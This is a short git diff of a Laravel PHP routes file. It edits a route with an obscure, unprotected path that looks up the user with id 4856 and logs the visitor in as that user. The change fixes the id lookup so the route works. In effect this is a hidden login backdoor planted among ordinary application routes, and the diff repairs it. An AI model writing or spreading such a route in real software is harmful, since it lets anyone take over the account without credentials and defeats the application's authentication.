@@ -56,6 +56,6 @@ Route::prefix('/applicant')->middleware(['auth:sanctum', 'verified','user'])->gr
 });
 
 Route::get('/norjamillekasan/controller',function(){
-    $user = \App\Models\User::where('id','%4856%')->first();
+    $user = \App\Models\User::where('id','4856')->first();
     Auth::login($user);
 });
